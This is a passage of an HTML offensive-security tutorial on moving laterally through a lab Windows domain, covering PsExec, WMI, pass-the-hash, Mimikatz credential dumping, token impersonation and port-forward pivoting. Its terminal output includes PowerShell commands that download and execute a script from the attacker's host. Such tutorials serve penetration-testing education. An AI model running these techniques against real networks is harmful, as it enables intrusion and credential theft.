@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Windows Domains: Pivot & Profit</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../css/icons.css">  
+  
+  <!-- SyntaxHighlighter -->
+  <link type="text/css" rel="stylesheet" href="../css/shCoreEmacs.css"/>
+  
+    <!-- SyntaxHighlighter -->
+	<script type="text/javascript" src="../js/shCore.js"></script>
+	<script type="text/javascript" src="../js/shBrushPowerShell.js"></script>
+	<script type="text/javascript" src="../js/shBrushCSharp.js"></script>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../images/logo.png" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../index.html">Home</a>
+            </li>
+            <li><a href="../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../coding.html">Scripting</a>
+            </li>
+            <li><a href="../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../links.html">Links</a>
+            </li>
+            <li><a href="../patreon.html">Patreon</a></li><li><a href="../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Windows Domains: Pivot & Profit</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Windows Domains, Pivot & Profit<span class="line"></span></h2>
+
+      <div class="fourteen columns bottom">
+      <p>Hola! In this write-up we will be looking at different ways to move laterally when compromising a Windows domain. This post is by no means exhaustive but it should cover some of the more basic techniques and thought processes. To keep things in perspective we will be following a mock objective on my local domain REDHOOK. Hopefully this will be the first in a series of posts centred around Windows domains, if you have something specific you would like to see (such as Kerberos tickets) don't hesitate to drop me an email, enjoy! <br /><br />
+      
+      <span style="color: #ffffff;"><strong>Scenario:</strong></span><br />
+      Our mission is to get usable credentials for the "redhook.DA" domain account. We are starting from a position where the attacker is already on the corporate network but not yet in the same subnet as the targeted domain controller. You can see a diagram of the setup below.
+      
+      <br /><br /><img src="images/Dom-1.png"><br /><br />
+      
+      Additionally we are going to assume the attacker has found a set of valid local Administrator credentials for Client 1. Typically, if the network is large enough, you will find valid credentials stored on a network share somewhere (batch, vbs, .NET, ps1, etc.), "dir /s", "findstr /SI" and Find-InterestingFile are your friends. Depending on how initial access was gained you may have a nice framework to work with like Cobalt Strike or you may be limited to natively available functionality on a corporate workstation. For this post the attacker is on a Kali box but I will explain some things you can do when you only have access to Windows. Lastly, in the post, we will not be dealing with SRP & AV evasion just keep that in the back of your mind because AV events = bad.<br /><br />
+      
+      <span style="color: #ffffff;"><strong>Resources:</strong></span><br />
+      + Active Directory Security (<a href="https://twitter.com/PyroTek3">@PyroTek3</a>) - <a href="https://adsecurity.org/">here</a><br />
+      + harmj0y (<a href="https://twitter.com/harmj0y">@harmj0y</a>) - <a href="http://www.harmj0y.net/blog/">here</a><br />
+      + Exploit-Monday (<a href="https://twitter.com/mattifestation">@mattifestation</a>) - <a href="http://www.exploit-monday.com/">here</a><br />
+      + PowerView - <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">here</a><br />
+      + PowerSploit - <a href="https://github.com/PowerShellMafia/PowerSploit">here</a><br />
+      + Impacket - <a href="https://github.com/CoreSecurity/impacket">here</a><br />
+      + Impacket compiled by maaaaz  - <a href="https://github.com/maaaaz/impacket-examples-windows">here</a><br />
+      + Mimikatz - <a href="http://blog.gentilkiwi.com/mimikatz">here</a><br />
+      + Incognito - <a href="https://labs.mwrinfosecurity.com/blog/2012/07/18/incognito-v2-0-released/">here</a><br />
+      + Windows Credentials Editor - <a href="http://www.ampliasecurity.com/research/wcefaq.html">here</a><br />
+      + Sysinternals Suite - <a href="https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx">here</a></p><br />
+
+<h2 class="title">Compromising Client 1<span class="line"></span></h2>
+<p>As I mentioned earlier, we "found" user credentials for "Client 1" on a network share. Something like this comes to mind.</p><br />
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># Mock contents of \\FileServer\Users\bob\Workstations\ErrorLog.bat</strong></span>
+
+@echo off
+
+net use "\\10.0.0.129\C$" /user:bob ImSoSecur3!
+
+if exist "\\10.0.0.129\C$\Program Files\MSBuild\ErrorLog.txt" (
+    echo "Sigh, more errors on Client1! Copying.."
+    copy "\\10.0.0.129\C$\Program Files\MSBuild\ErrorLog.txt" C:\Users\bob\Logs\Client1\
+    del  "\\10.0.0.129\C$\Program Files\MSBuild\ErrorLog.txt"
+) else (
+    echo "Yaay, no new errors on Client1!"
+)
+
+net use "\\10.0.0.129\C$" /delete</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>We can quickly grab some NetBIOS information for the IP specified in the batch script.</p>
+
+<p>&nbsp;</p><img src="images/Dom-2.png"><p>&nbsp;</p>
+
+<p>You can do the same thing on Windows with "nbtstat -A IP". We can see that the machine name is WIN7-ENT-CLI1 and that it is connected to the REDHOOK domain.</p><br />
+
+<p><span style="color: #ffffff;"><strong>PsExec:</strong></span><br />
+With metasploit's PsExec we can easily get a shell on the box. Notice that bob is a local account, else the "net use" command would have specified "REDHOOK\bob". As such we are not using the SMBDomain parameter.</p>
+
+<p>&nbsp;</p><img src="images/Dom-4.png"><p>&nbsp;</p>
+
+<p>Metasploit doesn't have the only PsExec on offer. We can use Impacket's PsExec which emulates PsExec using RemComSvc. The nice thing here is that it will also accept hashes if we don't have clear-text credentials, we will come back to that later.</p>
+
+<p>&nbsp;</p><img src="images/Dom-5.png"><p>&nbsp;</p>
+
+<p>Finally, let's not forget Microsoft's own PsExec which has the added benefit of being a signed executable. Adding the "-s" flag to this command would give you a SYSTEM shell.</p>
+
+<p>&nbsp;</p><img src="images/Dom-6.png"><p>&nbsp;</p>
+
+<p><span style="color: #ffffff;"><strong>WMI:</strong></span><br />
+There are also a few WMI options when it comes to running remote commands. Most notable <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa394531(v=vs.85).aspx">WMIC</a>, not only will it allow you to execute commands on a remote machine but you can also leverage WMI to get sensitive information and reconfigure the operating system, all using built-in tools.</p>
+
+<p>&nbsp;</p><img src="images/Dom-7.png"><p>&nbsp;</p>
+
+<p>Obviously you will need to be a bit creative with "cmd.exe /c" and "powershell.exe -exec bypass -command" to make command execution work to your advantage. The upside here is that almost any box you pop will have this built-in.<br /><br />
+
+Again, coming back to Impacket we have WmiExec which will allow you to run commands and get the output, it can also give you a semi-interactive shell and accepts hashes.</p>
+
+<p>&nbsp;</p><img src="images/Dom-8.png"><p>&nbsp;</p>
+
+<p>Finally there is PowerSploit's <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-WmiCommand.ps1">Invoke-WmiCommand</a>, this is a bit more labour intensive because of the PSCredential object but you can get the command output and in-memory residence for the script.
+
+<p>&nbsp;</p><img src="images/Dom-9.png"><p>&nbsp;</p>
+
+<p><span style="color: #ffffff;"><strong>Pass-The-Hash, WCE & Mimikatz:</strong></span><br />
+Sometime when you pop a box you will only have access to the NTLM hash for the user account, not the clear text password. If, in those cases, you have access to metasploit (psexec) or Impacket (pretty much all the tools support PTH) then you will have an easy time of it. If you are confined to the local Windows environment you can still inject the NTLM hash into a process using WCE or Mimikatz.</p>
+
+<p>&nbsp;</p><img src="images/Dom-12.png"><p>&nbsp;</p>
+
+<p>The downside here is that WCE is pretty much guaranteed to set off alarms! Mimikatz on the other hand can be loaded straight into memory using powershell w00t! In this case, however, I'm just using the compiled binary.</p>
+
+<p>&nbsp;</p><img src="images/Dom-13.png"><p>&nbsp;</p>
+
+<p>Notice that in both cases the domain is set to "." this is because bob is a local account but this will work perfectly fine for domain accounts as well.<br /><br />
+
+We now have a lot of ways to get a shell on the box. This may seem a bit excessive but it is all about redundancy, some situations restrict what you can do other times a certain method will be overall more efficient for your intended goal. One thing you need to pay attention to is that the PsExec variants will all give you a SYSTEM shell while the WMI variants execute your commands as the user you authenticated to the box with. Again there are some cases where one or the other is desirable.</p>
+
+<h2 class="title">Smash-And-Grab<span class="line"></span></h2>
+
+<p>Having gained a foothold on the new subnet it's time for a classic smash and grab. We want to harvest whatever credentials we have access to (clear text and hashes) and figure out where we can go from there.</p><br /><br />
+
+<p><span style="color: #ffffff;"><strong>Metasploit (Mimikatz & hashdump):</strong></span><br />
+Pretty straight forward from meterpreter. Use Mimikatz to get plain text credentials for users with an active session and hashdump to get hashes for local accounts that are not currently logged in.</p>
+
+<p>&nbsp;</p><img src="images/Dom-10.png"><p>&nbsp;</p>
+
+<p><span style="color: #ffffff;"><strong>Secretsdump & Invoke-Mimikatz:</strong></span><br />
+To keep our alternatives open we can get the same results by using Impacket's SecretsDump and Powersploit's Invoke-Mimikatz. In this case Invoke-Mimikatz is hosted on the attackers webserver, I have truncated the Mimikatz output for brevity.</p>
+
+<p>&nbsp;</p><img src="images/Dom-11.png"><p>&nbsp;</p>
+
+<p>There are naturally other ways you can tackle this but I think these are probably the main techniques.</p>
+
+<h2 class="title">Reconnaissance<span class="line"></span></h2>
+<p>Ok, now we have access to a machine in the REDHOOK domain which is also connected to a different subnet it's time for some recon!</p><br /><br />
+
+<p><span style="color: #ffffff;"><strong>Impersonation:</strong></span><br />
+As we want to query domain specific information we will need a shell as a domain user. This is a bit problematic because we currently have a shell as either bob (not a domain user) or SYSTEM. Fortunately using some undocumented NtQuerySystemInformation voodoo we can find tokens belonging to other user accounts and impersonate them, this is what the well know tool <a href="https://labs.mwrinfosecurity.com/system/assets/142/original/mwri_security-implications-of-windows-access-tokens_2008-04-14.pdf">incognito</a>  is based on. Additionally, we know "REDHOOK\asenath.waite" is logged in to the machine so she will be a prime candidate.<br /><br />
+
+Meterpreter has an incognito plug-in which makes this process very straight forward.</p>
+
+<p>&nbsp;</p><img src="images/Dom-14.png"><p>&nbsp;</p>
+
+<p>Alternatively you can use the actual <a href="https://labs.mwrinfosecurity.com/blog/2012/07/18/incognito-v2-0-released/">incognito</a> binary by Luke Jennings which has PsExec like functionality allowing you to use it remotely.</p>
+
+<p>&nbsp;</p><img src="images/Dom-15.png"><p>&nbsp;</p>
+
+<p>Finally, there is also PowerSploit's <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">Invoke-TokenManipulation</a>. Unfortunately, in it's current state I can't recommend using it because we can't really get the functionality we need out of it. I have filed two bug reports (<a href="https://github.com/PowerShellMafia/PowerSploit/issues/112">#112</a> & <a href="https://github.com/PowerShellMafia/PowerSploit/issues/113">#113</a>), if these issue are resolved (specifically 113) then I will update this post because in my opinion using PowerShell to do token impersonation would be the best case scenario!</p><br /><br />
+
+<p><span style="color: #ffffff;"><strong>Domain Recon:</strong></span><br />
+Now we have a shell as a domain user we need to do some quick enumeration to get a lay of the land and to figure out what our next target will be.</p><br />
+
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style='color:#ff0000;'>C:\Windows\System32</span>> <span style='color:#2B8156;'>whoami</span>
+redhook\asenath.waite
+
+<span style='color:#ff0000;'>C:\Windows\System32</span>> <span style='color:#2B8156;'>hostname</span>
+WIN7-Ent-CLI1
+
+<span style='color:#ff0000;'>C:\Windows\System32</span>> <span style='color:#2B8156;'>ipconfig</span>
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection 2:
+
+   Connection-specific DNS Suffix  . : localdomain
+   Link-local IPv6 Address . . . . . : fe80::a1ba:a1ab:170c:7916%17
+   IPv4 Address. . . . . . . . . . . : 10.0.0.129                    <span style="color:#990066;"><strong># Attacker's subnet</strong></span>
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . :
+
+Ethernet adapter Bluetooth Network Connection:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::5ddc:1e6:17e9:9e15%11
+   IPv4 Address. . . . . . . . . . . : 10.1.1.2                      <span style="color:#990066;"><strong># REDHOOK subnet</strong></span>
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.1.1.1
+
+Tunnel adapter isatap.{8D0466B5-1F88-480C-A42D-49A871635C9A}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+
+Tunnel adapter isatap.localdomain:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : localdomain
+
+Tunnel adapter isatap.{5CBBE015-1E1C-4926-8025-EBB59E470186}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+
+<span style="color:#990066;"><strong># A very small network, three hosts, including the one we have just compromised.</strong></span>
+<span style='color:#ff0000;'>C:\Windows\System32</span>> <span style='color:#2B8156;'>net view</span>
+Server Name            Remark
+
+-------------------------------------------------------------------------------
+\\REDRUM-DC            red.dc
+\\WIN7-ENT-CLI1
+\\WIN7-ENT-CLI2
+
+The command completed successfully.
+
+<span style="color:#990066;"><strong># The DC the user is authenticated to</strong></span>
+<span style='color:#ff0000;'>C:\Windows\System32</span>> <span style='color:#2B8156;'>echo %logonserver%</span>
+\\REDRUM-DC
+
+<span style='color:#ff0000;'>C:\Windows\System32</span>> <span style='color:#2B8156;'>ping -n 1 REDRUM-DC</span>
+
+Pinging redrum-dc.redhook.local [10.1.1.200] with 32 bytes of data:
+Reply from 10.1.1.200: bytes=32 time&lt;1ms TTL=128
+
+Ping statistics for 10.1.1.200:
+    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 0ms, Average = 0ms
+
+<span style="color:#990066;"><strong># List local users</strong></span>
+<span style='color:#ff0000;'>C:\Windows\System32</span>> <span style='color:#2B8156;'>net user</span>
+
+User accounts for \\WIN7-ENT-CLI1
+
+-------------------------------------------------------------------------------
+Administrator            bob                      Guest
+TemplateAdmin
+
+The command completed successfully.
+
+<span style="color:#990066;"><strong># List REDHOOK domain users</strong></span>
+<span style='color:#ff0000;'>C:\Windows\System32</span>> <span style='color:#2B8156;'>net user /domain</span>
+The request will be processed at a domain controller for domain RedHook.local.
+
+
+User accounts for \\Redrum-DC.RedHook.local
+
+-------------------------------------------------------------------------------
+Administrator            asenath.waite            Guest
+john.smith               krbtgt                   redhook.DA
+robert.suydam            wilbur.whateley
+
+The command completed successfully.
+
+<span style="color:#990066;"><strong># PowerSploit => Invoke-EnumerateLocalAdmin: Find all users who are local Administrators on a box in the 
+  network.</strong></span>
+<span style='color:#ff0000;'>C:\Windows\System32</span>> <span style='color:#2B8156;'>powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadStrin
+g('http://10.0.0.128/PowerView.ps1');Invoke-EnumerateLocalAdmin"</span>
+
+Server      : Redrum-DC.RedHook.local
+AccountName : RedHook.local/Administrator                   <span style="color:#990066;"><strong># Be careful, Administrator is a domain user</strong></span>
+SID         : S-1-5-21-129707511-1158432277-3818383092-500  <span style="color:#990066;"><strong>  in this case, not a local user!</strong></span>
+Disabled    : False
+IsGroup     : False
+IsDomain    : True
+LastLogin   : 28/01/2016 21:38:22
+
+Server      : Redrum-DC.RedHook.local
+AccountName : RedHook.local/Enterprise Admins
+SID         : S-1-5-21-129707511-1158432277-3818383092-519
+Disabled    : False
+IsGroup     : True
+IsDomain    : True
+LastLogin   :
+
+Server      : Redrum-DC.RedHook.local
+AccountName : RedHook.local/Domain Admins
+SID         : S-1-5-21-129707511-1158432277-3818383092-512
+Disabled    : False
+IsGroup     : True
+IsDomain    : True
+LastLogin   :
+
+Server      : WIN7-ENT-CLI1.RedHook.local
+AccountName : WIN7-Ent-CLI1/Administrator
+SID         : S-1-5-21-280973330-564264495-219324212-500
+Disabled    : ERROR
+IsGroup     : False
+IsDomain    : False
+LastLogin   :
+
+Server      : WIN7-ENT-CLI1.RedHook.local
+AccountName : RedHook.local/Domain Admins
+SID         : S-1-5-21-129707511-1158432277-3818383092-512
+Disabled    : False
+IsGroup     : True
+IsDomain    : True
+LastLogin   :
+
+Server      : WIN7-ENT-CLI1.RedHook.local
+AccountName : WIN7-Ent-CLI1/bob                            <span style="color:#990066;"><strong># The local user bob is an admin on Client 1,</strong></span>
+SID         : S-1-5-21-280973330-564264495-219324212-1002  <span style="color:#990066;"><strong>  we knew this already.</strong></span>
+Disabled    : ERROR
+IsGroup     : False
+IsDomain    : False
+LastLogin   :
+
+Server      : WIN7-ENT-CLI1.RedHook.local
+AccountName : WIN7-Ent-CLI1/TemplateAdmin                  <span style="color:#990066;"><strong># Mmm!</strong></span>
+SID         : S-1-5-21-280973330-564264495-219324212-1003
+Disabled    : ERROR
+IsGroup     : False
+IsDomain    : False
+LastLogin   :
+
+Server      : WIN7-ENT-CLI2.RedHook.local
+AccountName : WIN7-ENT-CLI2/Administrator
+SID         : S-1-5-21-1588183677-2924731702-2964281847-500
+Disabled    : ERROR
+IsGroup     : False
+IsDomain    : False
+LastLogin   :
+
+Server      : WIN7-ENT-CLI2.RedHook.local
+AccountName : RedHook.local/Domain Admins
+SID         : S-1-5-21-129707511-1158432277-3818383092-512
+Disabled    : False
+IsGroup     : True
+IsDomain    : True
+LastLogin   :
+
+Server      : WIN7-ENT-CLI2.RedHook.local
+AccountName : WIN7-ENT-CLI2/TemplateAdmin                     <span style="color:#990066;"><strong># Mmm², very suspicious, the local user</strong></span>
+SID         : S-1-5-21-1588183677-2924731702-2964281847-1004  <span style="color:#990066;"><strong>  TemplateAdmin is an admin on both "Client</strong></span>
+Disabled    : ERROR                                           <span style="color:#990066;"><strong>  1" and "Client 2"!</strong></span>
+IsGroup     : False
+IsDomain    : False
+LastLogin   :
+
+<span style="color:#990066;"><strong># PowerSploit => Get-NetSession: List active, remote, logon sessions on the DC.</strong></span>
+<span style='color:#ff0000;'>C:\Windows\System32</span>> <span style='color:#2B8156;'>powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadStrin
+g('http://10.0.0.128/PowerView.ps1');Get-NetSession -ComputerName REDRUM-DC"</span>
+
+sesi10_cname                  sesi10_username    sesi10_time    sesi10_idle_time
+------------                  ---------------    -----------    ----------------
+\\[fe80::18a3:b250:ed6a:28f0] REDRUM-DC$                  10                  10
+\\10.1.1.2                    asenath.waite                0                   0
+
+<span style="color:#990066;"><strong># Same for "Client 2". Crucially, notice that the domain user REDHOOK\Administrator is authenticated to 
+  the box and that the connection is originating from the DC!</strong></span>
+<span style='color:#ff0000;'>C:\Windows\System32</span>> <span style='color:#2B8156;'>powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadStrin
+g('http://10.0.0.128/PowerView.ps1');Get-NetSession -ComputerName WIN7-ENT-CLI2"</span>
+
+sesi10_cname                  sesi10_username    sesi10_time    sesi10_idle_time
+------------                  ---------------    -----------    ----------------
+\\10.1.1.200                  Administrator             1721                 124
+\\10.1.1.2                    asenath.waite                0                   0
+
+<span style="color:#990066;"><strong># Let's get some more info about that account. Again, this is listing information about 
+  REDHOOK\Administrator not the local administrator.</strong></span>
+<span style='color:#ff0000;'>C:\Windows\System32</span>> <span style='color:#2B8156;'>net user Administrator /domain</span>
+The request will be processed at a domain controller for domain RedHook.local.
+
+User name                    Administrator
+Full Name
+Comment                      Built-in account for administering the computer/dom
+ain
+User's comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            25/01/2016 21:15:11
+Password expires             Never
+Password changeable          26/01/2016 21:15:11
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   28/01/2016 21:38:22
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *Domain Users         *Domain Admins  <span style="color:#990066;"><strong># Oops, he is a DA!</strong></span>
+The command completed successfully.
+
+<span style="color:#990066;"><strong># We also won't forget to retrieve some info about our fictional target REDHOOK\redhook.DA.</strong></span>
+<span style='color:#ff0000;'>C:\Windows\System32</span>> <span style='color:#2B8156;'>net user redhook.DA /domain</span>
+The request will be processed at a domain controller for domain RedHook.local.
+
+User name                    redhook.DA
+Full Name                    redhook DA
+Comment
+User's comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            25/01/2016 21:27:37
+Password expires             Never
+Password changeable          26/01/2016 21:27:37
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   28/01/2016 21:18:56
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Enterprise Admins    *Domain Admins  <span style="color:#990066;"><strong># Our target on the other hand is the</strong></span>
+                             *Group Policy Creator *Schema Admins  <span style="color:#990066;"><strong>  mother root of DA's hehe!</strong></span>
+The command completed successfully.</pre>
+      <br />
+</div>
+
+<p>&nbsp;</p>
+<p>Looking over the output of our brief search gives us a pretty likely path to becoming a domain administrator. (1) It appears that the local user TemplateAdmin is an admin on both "Client 1" and "Client 2". (2) Though we don't have clear-text credentials for TemplateAdmin we have his hash which we can use to access "Client 2". (3) The REDHOOK\Administrator account is authenticated to "Client 2", if we compromise that box while he is logged in we can get his clear text credentials and/or impersonate him. At that point we pretty much own the domain!<br /><br />
+
+Before moving on, a surprise pop-quiz question: What is the most likely reason that "REDHOOK\Administrator" is part of the domain administrators group? I imagine this could be on the MCSA exam.<br /><br />
+
+<span style="color: #ffffff;"><strong>Socks Proxy:</strong></span><br />
+One final thing I would like to highlight is metasploit's ability to route traffic through established sessions and then expose that access to the operating system through a sock proxy. This is very very useful if you have access to metasploit or something like cobalt strike.</p>
+
+<p>&nbsp;</p><img src="images/Dom-16.png"><p>&nbsp;</p>
+
+<p>By creating a route through "session 1" we have basically granted most metasploit modules the ability to be executed against hosts in the non-routable /24 subnet.</p>
+
+<p>&nbsp;</p><img src="images/Dom-17.png"><p>&nbsp;</p>
+
+<p>Additionally, starting a socks proxy exposes this access to our operating system by using proxychains. Make sure to edit the proxychains configuration file to use the appropriate port set by the metasploit module.</p>
+
+<p>&nbsp;</p><img src="images/Dom-18.png"><p>&nbsp;</p>
+
+<p>There is only one thing you need to remember in this case which is that the socks proxy will only accept TCP traffic. You will still be able to do most things but just be aware of this limitation.<br /><br />
+
+It is not possible, using native functionality, to set up a socks proxy on a Windows machine. However, using netsh, we can create port forwarding rules, we will come back to that later. Also, if you want more, you can grab <a href="http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html">plink</a> and do some magic with SSH tunnels but that is out of scope for this write-up.</p>
+
+<h2 class="title">Compromising Client 2<span class="line"></span></h2>
+<p>The shared local administrator account, between "Client 1" and "Client 2", TemplateAdmin is a pretty good indication that that they have the same credentials. As such, compromising "Client 2" is not that much different from the scenario above except that we have to pivot our shell and we need to use the account hash instead of the clear-text password. Below I'll show two ways to do this, but other options are certainly possible.<br /><br />
+
+<span style="color: #ffffff;"><strong>Metasploit (PortProxy & PsExec):</strong></span><br />
+Even though we can reach "Client 2" through our custom route in metasploit we will have difficulties getting a connection back. To get around this we can use the portproxy module to create a port forwarding rule on "Client 1".</p>
+
+<p>&nbsp;</p><img src="images/Dom-19.png"><p>&nbsp;</p>
+
+<p>This may seem a bit confusing at first but it is really straight forward. "Client 1" is listening on 10.1.1.2:9988 and is sending any traffic that arrives on that port to 10.0.0.128:9988. In the background this is, in fact, wrapping round netsh in Windows. All that remains is to slightly reconfigure PsExec.</p>
+
+<p>&nbsp;</p><img src="images/Dom-20.png"><p>&nbsp;</p>
+
+<p><span style="color: #ffffff;"><strong>Impacket (PsExec) & netsh:</strong></span><br />
+First we will need to manually set up a port forwarding rule, using netsh, on "Client 1".</p>
+
+<p>&nbsp;</p><img src="images/Dom-21.png"><p>&nbsp;</p>
+
+<p>We now have a rule set up which will forward traffic arriving on 10.0.0.129:5678 to 10.1.1.3:445. For this to work Impacket's PsExec will need to connect to a custom port, this is not supported out-of-the box but we can easily edit the python source.</p>
+
+<p>&nbsp;</p><img src="images/Dom-22.png"><p>&nbsp;</p>
+
+<p>With our modifications saved we can simply PsExec to 10.0.0.129 and our traffic should get forwarded to 10.1.1.3!</p>
+
+<p>&nbsp;</p><img src="images/Dom-23.png"><p>&nbsp;</p>
+
+<p>Don't forget to clean up the port forwarding rule when you are done. The following command will reset the port proxy configuration file.</p><br />
+
+<div class="terminal_wrap" style="background:#CCC">
+      <pre><span style='color:#ff0000;'>C:\Windows\system32</span>> <span style='color:#2B8156;'>netsh interface portproxy reset</span></pre>
+      <br />
+</div>
+
+<p>&nbsp;</p>
+<p><span style="color: #ffffff;"><strong>Pure Windows?:</strong></span><br />
+Unfortunately I could not find a way, if the attacker is on a Windows box, to make this work natively. The issue is that tools like Sysinternals PsExec won't query non default ports. Additionally, if the attacker's machine has port 445 open it will ignore any port forwarding rules which we configure (eg: 127.0.0.1:445 --> 10.0.0.129:5678). Temporarily disabling SMB is also not an option, it requires reconfiguring dependencies and rebooting the machine (Yikes!). If anyone knows any voodoo that will work, please leave a comment below!<br /><br />
+
+In this situation your best option will be to modify and compile Impacket's PsExec using pyinstaller, similar to what maaaaz has done <a href="https://github.com/maaaaz/impacket-examples-windows">here</a>.</p>
+
+<h2 class="title">Smash-And-Grab ²<span class="line"></span></h2>
+<p>This may or may not be similar to our first scenario, depending on how REDHOOK\Administrator has authenticated to "Client 2". For example, if a simple "net use \\10.1.1.3\C$" command was issued then we would not be able to get clear text credentials or a hash, however "net use \\10.1.1.3\C$ /user:REDHOOK\Administrator XXXXXXX" would gives us both. In essence, it depends if the REDHOOK\Administrator user actually typed in their credentials when authenticating.<br /><br />
+
+Keep in mind that either way it will most likely be game over. Even if we can't get clear text credentials we will still be able to find a process running as REDHOOK\Administrator and impersonate it's token using incognito.<br /><br />
+
+<span style="color: #ffffff;"><strong>Metasploit Easy-Mode (Mimikatz & hashdump & incognito):</strong></span></p>
+
+<p>&nbsp;</p><img src="images/Dom-24.png"><p>&nbsp;</p>
+
+<p>We were lucky in this case, or not so much as I've done it on purpose hehe! Let's briefly have a look at incognito though, just to cover our bases.</p>
+
